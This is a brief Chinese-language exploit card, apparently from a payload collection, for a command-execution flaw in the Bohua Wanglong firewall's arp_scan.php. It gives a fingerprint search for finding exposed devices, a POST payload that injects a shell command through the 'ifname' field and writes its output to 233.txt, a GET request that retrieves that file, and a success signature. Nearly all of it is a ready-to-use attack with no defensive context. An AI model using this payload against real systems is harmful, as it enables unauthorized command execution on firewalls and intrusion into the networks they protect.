# 博华网龙防火墙系统arp_scan命令执行漏洞

博华网龙防火墙系统arp_scan ｜ 命令执行 ｜ —
- **指纹**：`title="博华网龙"`
- **请求**：`POST /firewall/arp_scan.php HTTP/1.1`

**Payload**
```
scan=1&ifname=;ls>233.txt;
上传定位
GET /firewall/233.txt HTTP/1.1
Host:
```
- **响应特征**：200 arp_scan.php